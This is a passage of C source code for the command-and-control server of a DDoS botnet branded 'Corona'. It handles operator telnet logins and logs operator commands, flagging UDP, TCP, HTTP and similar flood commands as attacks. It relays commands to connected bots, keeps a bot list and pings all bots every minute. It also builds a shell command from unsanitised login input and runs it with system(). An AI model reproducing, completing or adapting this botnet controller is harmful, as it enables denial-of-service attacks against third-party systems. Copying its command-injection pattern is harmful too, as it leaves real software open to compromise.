	    if(strstr(buf, "cls")){

        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
     	}
	    
     			trim(buf);
                if(send(thefd, "\e[0;31m[\e[0;36mCorona\e[0;31m@\e[0;36mBotnet\e[0;31m\e[0;31m]: \e[0m", 64, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
				if(strstr(buf, "cls") || strstr(buf, "banners") || strstr(buf, "help") || strstr(buf, "bots") || strstr(buf, "cmds") || strstr(buf, "info") || strstr(buf, "senpai") || strstr(buf, "banksy") || strstr(buf, "error")) // change these if ur bot has custom commands
				{
					printf("[%s Used: \"%s\"]\n",usernamez, buf);
				}
				else if(strstr(buf, "STD") || strstr(buf, "UDP") || strstr(buf, "TCP") || strstr(buf, "HTTP") || strstr(buf, "RAWUDP") || strstr(buf, "UNKNOWN")) // change these if ur bot has custom commands
				{
					printf("[%s Attacking: \"%s\"]\n",usernamez, buf);
				}
				else
				{
					printf("[%s Said: \"%s\"]\n",usernamez, buf);
				}
                FILE *logFile;
                logFile = fopen("report.sql", "a");
		        fprintf(logFile, "[Reporting User: %s]: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
		struct epoll_event event;
        char Username[20], Password[20];
        #ifdef User
        printf("Please Enter Username: ");
        scanf("%s",Username);
        printf("Please Enter Password: ");
        scanf("%s",Password);
        char hahaha[80];
        sprintf(hahaha, "echo %s %s >> users.sql", Username, Password);
        system(hahaha);
        #endif
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
		
}

int main (int argc, char *argv[], void *sock)
{
	
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc port] \n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("[\x1b[36mCorona \x1b[32mCnC\x1b[37m]-[\x1b[31mACTION\x1b[37m]: Net Started.\n---------------\n[\x1b[36mCorona \x1b[32mCnC\x1b[37m]: \n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "Corona");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}